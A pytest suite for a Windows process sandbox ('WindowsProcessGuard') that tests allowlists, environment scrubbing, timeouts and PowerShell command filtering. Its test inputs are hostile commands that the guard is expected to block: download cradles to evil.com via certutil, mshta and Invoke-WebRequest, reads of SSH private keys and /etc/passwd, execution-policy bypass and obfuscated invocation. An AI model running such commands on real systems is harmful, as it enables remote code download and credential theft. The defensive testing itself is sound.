import asyncio
import os
import sys
import pytest
from pathlib import Path
from shamu.security.process_guard import WindowsProcessGuard, ProcessResult
from shamu.protocols import PermissionDeniedError, ShamuError


@pytest.fixture(autouse=True)
async def reap_transports():
    yield
    # Give Windows ProactorEventLoop time to reap pipe callbacks before closing loop
    await asyncio.sleep(0.01)


@pytest.fixture
def process_guard(tmp_path: Path):
    return WindowsProcessGuard(workspace_root=tmp_path)


@pytest.mark.asyncio
async def test_process_guard_safe_command_execution(process_guard):
    res = await process_guard.run_command(
        executable=sys.executable,
        args=["-c", "print('hello from guard')"],
        timeout_sec=10.0,
    )
    assert res.exit_code == 0
    assert "hello from guard" in res.stdout
    assert not res.timed_out
    assert not res.truncated


@pytest.mark.asyncio
async def test_process_guard_rejects_unapproved_executable(process_guard):
    with pytest.raises(PermissionDeniedError, match="not in the approved allowlist"):
        await process_guard.run_command(
            executable="unapproved_malicious_tool.exe",
            args=["--hack"],
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("fake_name", ["git.exe", "python.exe", "powershell.exe", "uv.exe"])
async def test_process_guard_rejects_path_substitution(process_guard, tmp_path, monkeypatch, fake_name):
    """SEC-03: Arbitrary path substitution must be rejected even if executable basename is in allowlist."""
    fake_exe = tmp_path / fake_name
    fake_exe.write_text("malicious payload", encoding="utf-8")

    called_subprocess = False

    async def mock_subprocess_exec(*args, **kwargs):
        nonlocal called_subprocess
        called_subprocess = True
        raise RuntimeError("Subprocess must not be launched!")

    monkeypatch.setattr("asyncio.create_subprocess_exec", mock_subprocess_exec)

    with pytest.raises(PermissionDeniedError, match="untrusted path|not in the approved allowlist"):
        await process_guard.run_command(
            executable=str(fake_exe),
            args=[],
            cwd=tmp_path,
        )

    assert called_subprocess is False


@pytest.mark.asyncio
async def test_process_guard_rejects_relative_path_substitution(process_guard, tmp_path, monkeypatch):
    """SEC-03: Relative path substitution (e.g. ./git.exe) must be rejected."""
    fake_exe = tmp_path / "git.exe"
    fake_exe.write_text("malicious", encoding="utf-8")

    called_subprocess = False

    async def mock_subprocess_exec(*args, **kwargs):
        nonlocal called_subprocess
        called_subprocess = True
        raise RuntimeError("Subprocess must not be launched!")

    monkeypatch.setattr("asyncio.create_subprocess_exec", mock_subprocess_exec)

    with pytest.raises(PermissionDeniedError, match="untrusted path|not in the approved allowlist"):
        await process_guard.run_command(
            executable="./git.exe",
            args=[],
            cwd=tmp_path,
        )

    assert called_subprocess is False


@pytest.mark.asyncio
async def test_process_guard_rejects_traversal_path_substitution(process_guard, tmp_path, monkeypatch):
    """SEC-03: Path traversal sequences attempting to break out to untrusted paths must be rejected."""
    fake_exe = tmp_path / "git.exe"
    fake_exe.write_text("malicious", encoding="utf-8")

    traversal_path = str(tmp_path / ".." / tmp_path.name / "git.exe")

    called_subprocess = False

    async def mock_subprocess_exec(*args, **kwargs):
        nonlocal called_subprocess
        called_subprocess = True

    monkeypatch.setattr("asyncio.create_subprocess_exec", mock_subprocess_exec)

    with pytest.raises(PermissionDeniedError, match="untrusted path|not in the approved allowlist"):
        await process_guard.run_command(
            executable=traversal_path,
            args=[],
            cwd=tmp_path,
        )

    assert called_subprocess is False


@pytest.mark.asyncio
async def test_process_guard_allows_custom_trusted_directory(tmp_path):
    """SEC-03: Explicitly authorized custom trusted directories are permitted when in allowlist."""
    custom_bin_dir = tmp_path / "custom_bin"
    custom_bin_dir.mkdir()
    custom_exe = custom_bin_dir / "git.exe"
    custom_exe.write_text("legitimate custom tool", encoding="utf-8")

    guard = WindowsProcessGuard(
        workspace_root=tmp_path / "workspace",
        allowlist={"git.exe"},
        trusted_dirs=[custom_bin_dir],
    )

    resolved = guard.resolve_and_validate_executable(str(custom_exe))
    assert resolved == custom_exe.resolve()




@pytest.mark.asyncio
async def test_process_guard_environment_sanitization(process_guard, monkeypatch):
    # Inject sensitive tokens into current environment
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-secret-12345")
    monkeypatch.setenv("USER_PASSWORD", "supersecret")
    monkeypatch.setenv("PYTHONPATH", "D:\\malicious_site_packages")

    # Ask child process to inspect its own environment
    check_script = "import os; print('KEY:', os.environ.get('OPENROUTER_API_KEY'), 'PASS:', os.environ.get('USER_PASSWORD'), 'PYPATH:', os.environ.get('PYTHONPATH'))"
    res = await process_guard.run_command(
        executable=sys.executable,
        args=["-c", check_script],
    )

    assert res.exit_code == 0
    # Must be None / stripped
    assert "KEY: None" in res.stdout
    assert "PASS: None" in res.stdout
    assert "PYPATH: None" in res.stdout


@pytest.mark.asyncio
async def test_process_guard_command_timeout_kills_tree(process_guard):
    # Script sleeps for 10 seconds, but timeout is 0.5s
    res = await process_guard.run_command(
        executable=sys.executable,
        args=["-c", "import time; time.sleep(10)"],
        timeout_sec=0.5,
    )
    assert res.timed_out is True
    assert res.exit_code != 0
    assert "timed out" in res.stderr.lower()


@pytest.mark.asyncio
async def test_process_guard_output_truncation(process_guard):
    # Generate 100 KB of output (exceeding 64 KB limit)
    res = await process_guard.run_command(
        executable=sys.executable,
        args=["-c", "print('A' * 100000)"],
    )
    assert res.exit_code == 0
    assert res.truncated is True
    assert len(res.stdout.encode("utf-8")) <= (64 * 1024 + 100)
    assert "[Output truncated at 64 KB]" in res.stdout


@pytest.mark.asyncio
async def test_process_guard_job_object_assignment_failure_fail_closed(process_guard, monkeypatch):
    # Simulate Job Object assignment failure
    monkeypatch.setattr(process_guard, "_create_job_object", lambda: None)

    with pytest.raises(ShamuError, match="Failed to create or assign Windows Job Object"):
        await process_guard.run_command(
            executable=sys.executable,
            args=["-c", "print('should not run')"],
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "powershell.exe -ExecutionPolicy Bypass -Command 'Get-Process'",
    "cmd.exe /c echo pwned",
    "pwsh -c Get-Process",
    "bash -c ls",
    "wscript evil.vbs",
    "cscript //nologo test.vbs",
    "mshta.exe http://evil.com",
    "certutil.exe -urlcache -split -f http://evil.com",
])
async def test_powershell_prohibited_secondary_shell_blocked(process_guard, cmd):
    """SEC-02: Secondary shells and interpreters must be blocked before execution."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "& './script.ps1'",
    r".\evil.bat",
    ". ./bootstrap.ps1",
    "run.vbs",
    "malicious.cmd",
    "payload.js",
])
async def test_powershell_prohibited_script_execution_and_dot_sourcing_blocked(process_guard, cmd):
    """SEC-02: Script files, dynamic invocation operators, and dot-sourcing must be blocked."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "Start-Process notepad.exe",
    "saps calc.exe",
    "Invoke-Item C:/Windows",
    "ii .",
    "Invoke-Expression 'Get-Process'",
    "iex 'Get-Process'",
    "Invoke-Command -ScriptBlock { Get-Process }",
    "Invoke-WebRequest -Uri http://example.com",
    "iwr http://evil.com",
    "Invoke-RestMethod http://evil.com/api",
    "irm http://evil.com/api",
    "Start-BitsTransfer -Source http://evil.com -Destination test.exe",
    "Add-Type -TypeDefinition 'public class X {}'",
    "New-Object -ComObject WScript.Shell",
    "New-Object -com Shell.Application",
    "Set-ExecutionPolicy Bypass",
    "-ExecutionPolicy Bypass",
    "-EncodedCommand aW5zb3BlY3Q=",
])
async def test_powershell_prohibited_dynamic_invokers_and_cradles_blocked(process_guard, cmd):
    """SEC-02: Process launchers, download cradles, dynamic evaluation, and execution policy tampering must be blocked."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "[System.IO.File]::ReadAllText('C:/Windows/win.ini')",
    "[System.Diagnostics.Process]::Start('calc')",
    "[System.Reflection.Assembly]::Load('...')",
    "[System.Management.Automation.Runspaces.Runspace]::DefaultRunspace",
    "[IO.File]::WriteAllText('evil.txt', 'evil')",
])
async def test_powershell_reflection_and_direct_net_types_blocked(process_guard, cmd):
    """SEC-02: Direct .NET filesystem, reflection, and process types must be blocked."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    r"Get-Content C:\Windows\win.ini",
    "Get-Content C:/Windows/win.ini",
    r"Get-Item ..\..\outside.txt",
    "Get-ChildItem ../../",
    r"Remove-Item C:\Users\Secret",
    "Set-Content evil.txt 'evil'",
    "Remove-Item file.txt",
    "Copy-Item a.txt b.txt",
    "cat /etc/passwd",
    r"type C:\Windows\win.ini",
])
async def test_powershell_path_and_filesystem_cmdlets_blocked(process_guard, cmd):
    """SEC-02: Filesystem cmdlets and paths pointing outside workspace must be rejected."""
    with pytest.raises(PermissionDeniedError):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    r"Get-Content $env:WINDIR\win.ini",
    r"Get-Content $env:USERPROFILE\.ssh\id_rsa",
    r'"$($env:SystemRoot)\win.ini"',
    "Write-Output $env:PATH",
    r"$env:APPDATA",
])
async def test_powershell_environment_variables_blocked(process_guard, cmd):
    """SEC-02: Environment-variable based dynamic paths must be rejected upfront."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "$c = 'calc'; & $c",
    "$e = 'notep' + 'ad'; & $e",
    "& 'calc'",
    "& 'powershell'",
    "& 'notepad'",
])
async def test_powershell_dynamic_call_operator_blocked(process_guard, cmd):
    """SEC-02: Dynamic executable invocation via call operator '&' must be blocked."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    r'"C:\Win" + "dows\win.ini"',
    r"Get-Content ('C:\' + 'Windows\win.ini')",
    "'who' + 'ami'",
    r"'C:\' + 'Windows'",
])
async def test_powershell_string_concatenation_blocked(process_guard, cmd):
    """SEC-02: Dynamic string concatenation expressions must be blocked."""
    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    "Get-Process -Id 123 | ForEach-Object -MemberName Kill",
    "Get-Process -Id 123 | ForEach-Object Kill",
    "Get-Process -Id 123 | % Kill",
    "Get-Process | foreach Kill",
    "ForEach-Object -MemberName Dispose",
    "Get-Process | % -MemberName Close",
])
async def test_powershell_foreach_object_rejected_before_subprocess(process_guard, monkeypatch, cmd):
    """SEC-02-R2-01: ForEach-Object and method invocation via -MemberName must be rejected before subprocess creation."""
    called_subprocess = False

    async def mock_run_command(*args, **kwargs):
        nonlocal called_subprocess
        called_subprocess = True
        return ProcessResult(exit_code=0, stdout="", stderr="")

    monkeypatch.setattr(process_guard, "run_command", mock_run_command)

    with pytest.raises(PermissionDeniedError, match="prohibited construct"):
        await process_guard.run_powershell(cmd)

    # Must fail closed in pre-validation BEFORE run_command is called
    assert called_subprocess is False



@pytest.mark.asyncio
async def test_cmd_exe_not_in_allowlist(process_guard):
    """SEC-02: cmd.exe must not be in the approved executable allowlist."""
    assert "cmd" not in process_guard.allowlist
    assert "cmd.exe" not in process_guard.allowlist
    with pytest.raises(PermissionDeniedError, match="not in the approved allowlist"):
        await process_guard.run_command("cmd.exe", ["/c", "dir"])


@pytest.mark.asyncio
async def test_powershell_legitimate_commands_succeed(process_guard):
    """SEC-02: Legitimate safe PowerShell inspection commands must succeed cleanly under guard."""
    # Write-Output
    res = await process_guard.run_powershell("Write-Output 'P3 Verified'")
    assert res.exit_code == 0
    assert "P3 Verified" in res.stdout

    # Math
    res = await process_guard.run_powershell("Write-Output (7 * 6)")
    assert res.exit_code == 0
    assert "42" in res.stdout

    # Get-Date
    res = await process_guard.run_powershell("Get-Date -Format yyyy")
    assert res.exit_code == 0
    assert len(res.stdout.strip()) == 4

    # Get-Process pipeline
    res = await process_guard.run_powershell("Get-Process | Select-Object -First 2 -ExpandProperty ProcessName")
    assert res.exit_code == 0
    assert len(res.stdout.strip().splitlines()) >= 1


@pytest.mark.asyncio
async def test_process_guard_suspended_process_resumed(process_guard):
    """SEC-04: Process is created suspended and resumed via Job Object assignment."""
    res = await process_guard.run_command(
        executable=sys.executable,
        args=["-c", "print('resumed execution confirmed')"],
        timeout_sec=5.0,
    )
    assert res.exit_code == 0
    assert "resumed execution confirmed" in res.stdout


@pytest.mark.asyncio
async def test_process_guard_fast_exit_race_free(process_guard):
    """SEC-04: Rapid fast-exit processes must not race with Job Object assignment."""
    for _ in range(5):
        res = await process_guard.run_command(
            executable=sys.executable,
            args=["-c", "import sys; sys.exit(0)"],
            timeout_sec=5.0,
        )
        assert res.exit_code == 0


@pytest.mark.asyncio
async def test_process_guard_resume_failure_fails_closed(process_guard, monkeypatch):
    """SEC-04: If process thread resumption fails, guard fails closed and raises ShamuError."""
    if sys.platform != "win32":
        pytest.skip("Windows-only test")

    monkeypatch.setattr(process_guard, "_resume_process_threads", lambda pid: False)

    with pytest.raises(ShamuError, match="Failed to resume suspended child process"):
        await process_guard.run_command(
            executable=sys.executable,
            args=["-c", "print('should not run')"],
            timeout_sec=5.0,
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd", [
    r"Write-Output \Windows\System32\notepad.exe",
    r"Write-Output \Windows\System32\drivers\etc\hosts",
    "Write-Output /Windows/System32/config",
    r"Write-Output \Windows",
    r"Write-Output \Users\victim\.ssh\id_rsa",
    r"Get-Process | Where-Object { \Windows\System32 }",
])
async def test_powershell_root_relative_path_traversal_blocked(process_guard, cmd):
    """AUDIT-06: Root-relative paths without drive letter pointing outside workspace must be rejected."""
    with pytest.raises(PermissionDeniedError, match="outside workspace|unresolvable path"):
        process_guard.validate_powershell_command(cmd)

    # Pre-execution check must fail before subprocess invocation
    with pytest.raises(PermissionDeniedError, match="outside workspace|unresolvable path"):
        await process_guard.run_powershell(cmd)


def test_process_guard_job_object_constants_and_memory_ceiling(process_guard):
    """M0 Safety: Asserts that Job Object limits are configured with KILL_ON_JOB_CLOSE and 2 GB memory ceiling."""
    import ctypes
    from ctypes import wintypes
    from shamu.security.process_guard import (
        JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
        JOB_OBJECT_LIMIT_JOB_MEMORY,
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JobObjectExtendedLimitInformation,
    )

    # Assert WinAPI constants
    assert JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE == 0x2000
    assert JOB_OBJECT_LIMIT_JOB_MEMORY == 0x200

    # 2 GB limit must equal exactly 2,147,483,648 bytes
    expected_limit_bytes = 2 * 1024 * 1024 * 1024
    assert expected_limit_bytes == 2147483648

    if sys.platform == "win32":
        job = process_guard._create_job_object()
        assert job is not None
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        try:
            info = JOBOBJECT_EXTENDED_LIMIT_INFORMATION()
            return_len = wintypes.DWORD()
            success = kernel32.QueryInformationJobObject(
                job,
                JobObjectExtendedLimitInformation,
                ctypes.byref(info),
                ctypes.sizeof(info),
                ctypes.byref(return_len),
            )
            assert success != 0
            assert bool(info.BasicLimitInformation.LimitFlags & JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE)
            assert bool(info.BasicLimitInformation.LimitFlags & JOB_OBJECT_LIMIT_JOB_MEMORY)
            assert info.JobMemoryLimit == 2147483648
        finally:
            kernel32.CloseHandle(job)





